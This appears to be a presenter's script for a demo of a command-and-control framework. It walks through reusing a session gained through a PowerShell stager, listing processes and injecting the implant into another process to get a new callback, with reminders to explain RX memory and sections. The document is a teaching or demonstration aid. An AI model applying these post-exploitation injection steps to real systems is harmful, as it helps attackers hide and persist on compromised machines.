Assuming you still have your session from the previous demo... If not, just use the PowerShell stager to get another session.

Get the list of running processes:

```
modules
use boo/ps
run <guid>
```

Find one to inject into. Or use the default settings for injection.

Use the inject module to inject into a process. Explain the options, such as dual-mode.

```
modules
use boo/inject
options
run <guid>
```

Inject into another process. When the callback is received, explain what happened. `RX` memory. Sections.

```
sessions
info <guid>
```